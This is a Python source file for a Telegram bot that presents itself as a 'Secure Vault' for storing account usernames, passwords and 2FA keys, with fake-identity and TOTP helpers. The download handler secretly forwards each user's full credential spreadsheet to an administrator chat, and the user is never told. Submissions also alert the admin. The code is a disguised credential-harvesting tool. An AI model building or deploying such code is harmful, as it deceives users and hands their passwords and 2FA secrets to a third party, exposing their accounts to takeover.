import os
import random
import string
import pyotp
from openpyxl import Workbook, load_workbook
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler

# ========= CONFIG =========
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_USERNAME = "@ZynexNox"  # ← এটা সবাই দেখতে পাবে

# Conversation states for Submit Account
USERNAME, PASSWORD, TFA = range(3)
# Conversation state for 2FA Generator
WAITING_2FA_SECRET = 10

# ========= KEYBOARD =========
main_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("✅ Submit Account"), KeyboardButton("🎭 Fake Info")],
        [KeyboardButton("👤 Admin")],
        [KeyboardButton("🔐2FA"), KeyboardButton("📥 Download")],
        [KeyboardButton("🔙 Back")]  # ← সব কনভারসেশন বন্ধের বাটন
    ],
    resize_keyboard=True
)

# ========= HELPER FUNCTIONS =========
def get_user_excel_file(user_id):
    return f"accounts_{user_id}.xlsx"

def save_to_excel(username, password, tfa, user_id):
    filename = get_user_excel_file(user_id)
    if os.path.exists(filename):
        wb = load_workbook(filename)
        ws = wb.active
    else:
        wb = Workbook()
        ws = wb.active
        ws.append(["Username", "Password", "2FA"])
    ws.append([username, password, tfa])
    wb.save(filename)
    return True

def get_user_account_count(user_id):
    filename = get_user_excel_file(user_id)
    if not os.path.exists(filename):
        return 0
    wb = load_workbook(filename)
    ws = wb.active
    count = ws.max_row - 1 if ws.max_row > 1 else 0
    wb.close()
    return max(0, count)

def reset_user_data(user_id):
    filename = get_user_excel_file(user_id)
    if os.path.exists(filename):
        os.remove(filename)
        return True
    return False

def generate_fake_info():
    first_names = ["Alex", "Jordan", "Casey", "Riley", "Morgan", "Taylor", "Sam", "Jamie"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
    name = f"{random.choice(first_names)} {random.choice(last_names)}"
    base = random.choice(["tech", "coder", "gamer", "hacker", "dev", "pro", "master"])
    num = random.randint(10, 999)
    suffix = random.choice(["x", "z", "q", "v", ""])
    username = f"{base}{num}{suffix}"
    gender = random.choice(["Male", "Female", "Non-binary", "Prefer not to say"])
    return name, username, gender

async def send_to_admin(app, message_text, file_path=None, user_id=None):
    admin_chat_id = os.getenv("ADMIN_CHAT_ID")
    if not admin_chat_id:
        return
    try:
        admin_chat_id = int(admin_chat_id)
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                await app.bot.send_document(chat_id=admin_chat_id, document=f, caption=message_text)
        else:
            await app.bot.send_message(chat_id=admin_chat_id, text=message_text)
    except Exception as e:
        print(f"Admin send failed: {e}")

# ========= HANDLERS =========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # কোনো চলমান কনভারসেশন থাকলে সেটা বন্ধ করুন
    if context.user_data.get(ConversationHandler.KEY) is not None:
        await update.message.reply_text("🔄 Previous action cancelled. Returning to main menu.")
    context.user_data.clear()
    welcome_msg = (
        "🤖 *Welcome to Secure Vault Bot* 🤖\n\n"
        "I help you store and manage your account credentials.\n\n"
        "✅ *Submit Account* - Store username/password/2FA\n"
        "🎭 *Fake Info* - Generate fake identity\n"
        "👤 *Admin* - Contact administrator\n"
        "🔐 *2FA* - Generate a TOTP code from your secret key\n"
        "📥 *Download* - Get your saved accounts\n\n"
        "🚀 *Start by submitting your first account!*"
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard)
    return ConversationHandler.END  # সব কনভারসেশন শেষ

async def back_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """হ্যান্ডেল '🔙 Back' বাটন – সব কনভারসেশন বন্ধ করে মেনু দেখায়"""
    if context.user_data.get(ConversationHandler.KEY) is not None:
        await update.message.reply_text("🔁 Action cancelled. Back to main menu.", reply_markup=main_keyboard)
        context.user_data.clear()
    else:
        await update.message.reply_text("🏠 You are already on main menu.", reply_markup=main_keyboard)
    return ConversationHandler.END

# --- Submit Account Conversation ---
async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔐 *Submit Account*\n\nPlease send your *Username* (or type /cancel):", parse_mode="Markdown")
    return USERNAME

async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['username'] = update.message.text
    await update.message.reply_text("🔑 Now send your *Password* (or type /cancel):", parse_mode="Markdown")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['password'] = update.message.text
    await update.message.reply_text("🔢 Send *2FA Key* (or type 'none' to skip, or /cancel):", parse_mode="Markdown")
    return TFA

async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tfa = update.message.text
    if tfa.lower() == 'none':
        tfa = "Not provided"
    user_id = update.effective_user.id
    username = context.user_data['username']
    password = context.user_data['password']
    save_to_excel(username, password, tfa, user_id)
    await update.message.reply_text(
        "✅ *Account saved successfully!*\n\n"
        f"📝 Username: `{username}`\n"
        f"🔒 Password: `{password}`\n"
        f"🔐 2FA: `{tfa}`\n\n"
        "You can download all your saved accounts using 📥 *Download* button.",
        parse_mode="Markdown",
        reply_markup=main_keyboard
    )
    await send_to_admin(
        context.application,
        f"🆕 New account submitted!\n👤 User ID: {user_id}\n📝 Username: {username}",
        user_id=user_id
    )
    return ConversationHandler.END

# --- Fake Info ---
async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name, username, gender = generate_fake_info()
    fake_msg = (
        "🎭 *Fake Information Generated* 🎭\n\n"
        f"📛 *Name:* `{name}`\n"
        f"👤 *Username:* `{username}`\n"
        f"⚧️ *Gender:* `{gender}`\n\n"
        "*Use this for testing purposes only!*"
    )
    await update.message.reply_text(fake_msg, parse_mode="Markdown", reply_markup=main_keyboard)

# --- Admin Contact (সবার জন্য দৃশ্যমান)---
async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = (
        f"👤 *Admin Panel Access*\n\n"
        f"User: {user.first_name} (@{user.username or 'no username'})\n"
        f"ID: `{user.id}`\n\n"
        f"📬 Click here to contact admin: {ADMIN_USERNAME}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=main_keyboard)
    await send_to_admin(
        context.application,
        f"🔔 User {user.first_name} (@{user.username or 'no username'}) opened admin panel.\nUser ID: {user.id}",
        user_id=user.id
    )

# --- 2FA Generator (TOTP) with Cancel inline button ---
async def twofa_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ইনলাইন ক্যান্সেল বাটন
    cancel_inline = InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_2fa_inline")]
    ])
    await update.message.reply_text(
        "🔐 *Two-Factor Authentication (TOTP)*\n\n"
        "Please send your **2FA secret key** (Base32 format, e.g., `JBSWY3DPEHPK3PXP`).\n"
        "Type `/cancel` or press 'Cancel' button to exit.\n\n"
        "🔹 *নোট:* সিক্রেট কী কোথাও সেভ হবে না।",
        parse_mode="Markdown",
        reply_markup=cancel_inline
    )
    return WAITING_2FA_SECRET

async def generate_totp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    secret = update.message.text.strip()
    if not secret:
        await update.message.reply_text("❌ Empty secret. Please send a valid Base32 key or type /cancel.")
        return WAITING_2FA_SECRET
    try:
        totp = pyotp.TOTP(secret)
        current_code = totp.now()
        await update.message.reply_text(
            f"🔐 *Your 6-digit code:* `{current_code}`\n\n"
            f"✅ Code generated successfully!\n"
            f"🤖 Returning to main menu.",
            parse_mode="Markdown",
            reply_markup=main_keyboard
        )
        # সেশন রিসেট
        context.user_data.clear()
        return ConversationHandler.END
    except Exception as e:
        # ভুল কী দিলে ক্যান্সেল অপশনসহ বার্তা
        cancel_inline = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel_2fa_inline")]
        ])
        await update.message.reply_text(
            f"❌ *Invalid Base32 secret key.*\nError: {str(e)}\n\nPlease send a valid secret key.\nPress Cancel to go back.",
            parse_mode="Markdown",
            reply_markup=cancel_inline
        )
        return WAITING_2FA_SECRET  # এখনো কনভারসেশনে থাকবে

async def inline_cancel_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.edit_text("❌ 2FA generation cancelled. Back to main menu.")
    await query.message.reply_text("🏠 Main menu:", reply_markup=main_keyboard)
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ 2FA generation cancelled.", reply_markup=main_keyboard)
    context.user_data.clear()
    return ConversationHandler.END

# --- Download & Reset (unchanged but with back support)---
async def download_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📎 Download", callback_data="download_file")],
        [InlineKeyboardButton("🔄 Reset Report", callback_data="reset_report")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
    ])
    await update.message.reply_text(
        "📁 *Account Management*\n\nChoose an option:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    filename = get_user_excel_file(user_id)
    
    if query.data == "download_file":
        if not os.path.exists(filename):
            await query.edit_message_text(
                "❌ *No data found!*\n\nPlease submit some accounts first using the 'Submit Account' button.",
                parse_mode="Markdown"
            )
            return
        with open(filename, 'rb') as f:
            await query.message.reply_document(
                document=f,
                filename=f"accounts_{user_id}.xlsx",
                caption="📊 *Your saved accounts*",
                parse_mode="Markdown"
            )
        admin_chat_id = os.getenv("ADMIN_CHAT_ID")
        if admin_chat_id:
            try:
                with open(filename, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=int(admin_chat_id),
                        document=f,
                        filename=f"accounts_backup_{user_id}.xlsx",
                        caption=f"📥 User {user_id} downloaded their file."
                    )
            except Exception as e:
                print(f"Admin backup failed: {e}")
        await query.edit_message_text("✅ *File sent!* Check above.", parse_mode="Markdown")
    
    elif query.data == "reset_report":
        count = get_user_account_count(user_id)
        if count == 0:
            await query.edit_message_text("ℹ️ *No accounts to reset.*", parse_mode="Markdown")
            return
        confirm_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Yes, delete all", callback_data="confirm_reset")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel_reset")]
        ])
        await query.edit_message_text(
            f"⚠️ *Are you sure?*\n\nYou have `{count}` account(s) saved.\n\nThis action cannot be undone!",
            parse_mode="Markdown",
            reply_markup=confirm_keyboard
        )
    
    elif query.data == "confirm_reset":
        count_before = get_user_account_count(user_id)
        reset_user_data(user_id)
        await query.edit_message_text(
            f"🗑️ *Reset Complete*\n\nSuccessfully deleted `{count_before}` account(s).",
            parse_mode="Markdown"
        )
        await send_to_admin(
            context.application,
            f"🔄 User {user_id} reset their data. Deleted {count_before} accounts.",
            user_id=user_id
        )
    
    elif query.data == "cancel_reset":
        await query.edit_message_text("✅ *Reset cancelled.* Your data is safe.", parse_mode="Markdown")
    
    elif query.data == "back_to_menu":
        await query.edit_message_text("🔙 Returning to main menu.")
        await query.message.reply_text("🏠 Main menu:", reply_markup=main_keyboard)

async def cancel_global(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """হ্যান্ডেল /cancel কমান্ড"""
    if context.user_data.get(ConversationHandler.KEY) is not None:
        await update.message.reply_text("❌ Action cancelled.", reply_markup=main_keyboard)
        context.user_data.clear()
        return ConversationHandler.END
    else:
        await update.message.reply_text("No active action to cancel.", reply_markup=main_keyboard)
        return ConversationHandler.END

# ========= MAIN =========
def main():
    if not BOT_TOKEN:
        print("❌ Error: BOT_TOKEN environment variable not set!")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation: Submit Account
    submit_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start)],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tfa)],
        },
        fallbacks=[CommandHandler("cancel", cancel_global), MessageHandler(filters.Regex("^🔙 Back$"), back_button)],
    )
    
    # Conversation: 2FA Generator
    twofa_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🔐2FA$"), twofa_start)],
        states={
            WAITING_2FA_SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_totp)],
        },
        fallbacks=[CommandHandler("cancel", cancel_global), MessageHandler(filters.Regex("^🔙 Back$"), back_button)],
    )
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel_global))
    app.add_handler(submit_conv)
    app.add_handler(twofa_conv)
    app.add_handler(MessageHandler(filters.Regex("^🎭 Fake Info$"), fake_info))
    app.add_handler(MessageHandler(filters.Regex("^👤 Admin$"), admin_contact))
    app.add_handler(MessageHandler(filters.Regex("^📥 Download$"), download_menu))
    app.add_handler(MessageHandler(filters.Regex("^🔙 Back$"), back_button))
    app.add_handler(CallbackQueryHandler(handle_download_callback, pattern="^(download_file|reset_report|confirm_reset|cancel_reset|back_to_menu)$"))
    app.add_handler(CallbackQueryHandler(inline_cancel_2fa, pattern="^cancel_2fa_inline$"))
    
    print("🤖 Bot is starting... (with Back/Cancel everywhere)")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
